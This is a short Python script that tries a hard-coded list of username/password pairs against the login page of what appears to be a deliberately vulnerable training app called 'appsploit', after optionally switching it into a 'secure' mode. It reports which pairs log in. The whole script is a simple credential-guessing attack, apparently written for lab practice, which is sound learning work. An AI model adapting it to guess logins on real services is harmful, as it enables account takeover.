#!/usr/bin/env python3
from sys import argv
import requests as rq
import json

try:
    appsploit_url = argv[1].rstrip("/")
except:
    appsploit_url = "http://localhost"

secure = True
appsploit_login_url = f"{appsploit_url}/login"
appsploit_toggle_secure_url = f"{appsploit_url}/togglesecure"

working_creds = list()

with rq.Session() as s:
    if secure:
        #Defaults to insecure session -> toggle to secure if running against secure
        res = s.get(appsploit_toggle_secure_url)
        res_text = json.loads(res.text)
        print(res_text)

    creds_list = [
        ("user1","user2pass"),
        ("user2","user1pass"),
        ("user1","user1pass"),
        ("user2","user2pass")
    ]

    for cred in creds_list:
        username, password = cred
        payload = {
            "username":username,
            "password":password
        }

        #Attempt login
        res = s.post(appsploit_login_url, payload)

        #Check for invalid user/password message
        idx = res.text.find("invalid username and/or password")

        #If invalid user/password message not found, login successful
        if idx < 0:
            print(f"Login Success: {username}, {password}")
            working_creds.append(cred)

for cred in working_creds:
    print(cred)